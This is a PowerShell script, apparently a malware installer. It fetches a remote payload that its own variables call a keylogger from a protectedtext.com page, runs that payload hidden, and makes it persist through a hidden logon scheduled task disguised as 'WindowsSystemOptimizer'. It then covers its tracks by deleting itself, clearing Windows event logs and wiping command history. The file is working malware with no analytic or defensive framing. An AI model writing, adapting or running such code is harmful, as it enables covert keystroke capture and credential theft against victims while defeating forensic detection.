param(
    [Parameter(Mandatory=$true)]
    [string]$Password  
)

$ProtectedTextUrl = "https://www.protectedtext.com/key_9321?action=read"
$TaskName = "WindowsSystemOptimizer"

function Invoke-SelfCleanup {
    
    $scriptPath = $MyInvocation.MyCommand.Path
    Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
    
   
    wevtutil cl Application | Out-Null
    wevtutil cl System | Out-Null
    
    
    Clear-History
    Set-PSReadlineOption -HistorySaveStyle SaveNothing
}

try {
    
    $body = @{ password = $Password } | ConvertTo-Json
    $response = Invoke-WebRequest -Uri $ProtectedTextUrl -Method Post -Body $body -ContentType "application/json" -UseBasicParsing
    $keyloggerScript = ($response.Content | ConvertFrom-Json).content

    
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$keyloggerScript`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $settings = New-ScheduledTaskSettingsSet `
        -Hidden `
        -AllowStartIfOnBatteries `
        -DontStopIfGoingOnBatteries `
        -StartWhenAvailable `
        -RunOnlyIfNetworkAvailable
    
    Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null

 
    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -Command `"$keyloggerScript`""
    

    Invoke-SelfCleanup
    Stop-Process -Id $PID -Force
}
catch {
    Invoke-SelfCleanup
    exit
}
